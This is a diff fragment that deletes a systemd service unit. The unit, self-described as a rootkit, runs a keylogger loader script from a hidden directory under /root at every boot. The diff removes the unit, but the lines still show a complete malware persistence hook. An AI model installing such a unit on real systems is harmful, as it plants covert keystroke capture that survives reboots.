@@ -1,9 +1,0 @@
-[Unit]
-Description=this is a damn rootkit
-
-[Service]
-Type=oneshot
-ExecStart=/root/.not_keylogger/klg_load.sh
-
-[Install]
-WantedBy=multi-user.target
